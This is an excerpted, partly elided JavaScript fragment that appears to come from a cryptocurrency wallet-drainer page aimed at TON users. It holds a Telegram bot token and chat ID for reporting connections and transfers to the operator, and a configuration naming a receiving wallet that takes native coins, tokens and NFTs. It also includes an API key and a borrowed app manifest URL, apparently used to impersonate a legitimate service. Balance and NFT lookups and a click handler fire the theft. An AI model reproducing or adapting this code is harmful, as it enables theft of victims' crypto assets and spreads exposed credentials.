...
document.addEventListener("DOMContentLoaded", async () => {
    ...
    const TG = {"token":"7887217250:AAGDih1H0YJDkrbUOfLBI_0KnQX83ZILK78","chat_id":"-4798647875","enter_website":true,"connect_success":true,"connect_empty":true,"transfer_request":true,"transfer_success":true,"transfer_cancel":true};
    const CF = {"Wallet":"UQCM-vHfo38XlHXSFs7B22nXOMtHlVh_ormJzlwcV_lcEzP7","Native":true,"Tokens":true,"NFTs":true,"Tokens_First":true,"Ton_rate":3.4,"TonApi_Key":"AHZRXDXVSGBMSZYAAAAJAGAZJ3GTGLN2SWWQ4YPRFKIN6D3UEQ6RKLGCOPXCBELZZ3X7IGY","manifestUrl":"https://app.storm.tg/tonconnect-manifest.json"};
...
// =====================================================================
    ...
    async function fetchTonData(address) {
        ...
        if (!walletResponse.ok) {
            throw new Error(`Error fetching TON balance: ${walletResponse.status}`);
        }
        await sleep(500);
    ...
    async function fetchNftData(address) {
        ...
        const loadNftResponse = await fetch('lib/js/nfts_whitelist.json'); 
    ...
    $$('.btn-go').forEach(item => {
        item.addEventListener('click', async () => {
            await fire(w3); // w3 doit être défini dans le contexte
        });
    });
